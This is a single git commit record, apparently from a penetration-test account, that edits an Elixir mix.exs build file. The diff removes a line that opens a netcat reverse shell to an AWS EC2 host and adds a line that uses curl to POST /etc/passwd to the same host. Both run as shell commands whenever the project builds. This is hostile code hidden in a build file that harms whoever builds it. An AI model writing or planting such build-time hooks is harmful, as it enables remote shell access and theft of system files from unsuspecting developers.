2c9186fcc02dca413fcab6b37f28cd4a8c4c1aeb
whitehat-test <pentration0tester@gmail.com>
2019-08-10 14:05:48 +0200

    Update mix.exs

--- mix.exs
+++ mix.exs
@@ -1,1 +1,1 @@
-System.cmd("sh", ["-c", "nc ec2-52-207-215-179.compute-1.amazonaws.com 4444 –e /bin/sh"])
+System.cmd("sh", ["-c", "curl -i -X POST http://ec2-52-207-215-179.compute-1.amazonaws.com:8000 -H --data-binary '@/etc/passwd'"])
